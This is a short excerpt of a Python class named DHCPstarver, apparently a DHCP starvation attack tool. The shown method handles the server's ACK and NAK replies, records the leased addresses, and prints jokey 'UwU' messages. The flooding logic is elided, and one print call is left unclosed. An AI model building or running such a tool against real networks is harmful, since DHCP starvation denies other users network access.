...
class DHCPstarver(object):
    ...
    def handler_acknowledgement(self, ack_nak_pkt):
        ...
        if ack_nak_pkt[DHCP].options[0][1] == 5:
            print("[*]UMG! Senwpai we have been noticed By DEWHASHEP Sewver! ")
            self.ip.append(ack_nak_pkt[BOOTP].yiaddr)
            print(f'[*]{ack_nak_pkt[BOOTP].yiaddr}  I have recieved an acknowlegement from the DHCP server UwU '
        ...
        # Duplicate ACK may happen due to packet loss
            ...
            print("[!]oh now :c we have recieved an NAK from the DHCP server OwO nuzzle wuzzle this is not good :C")
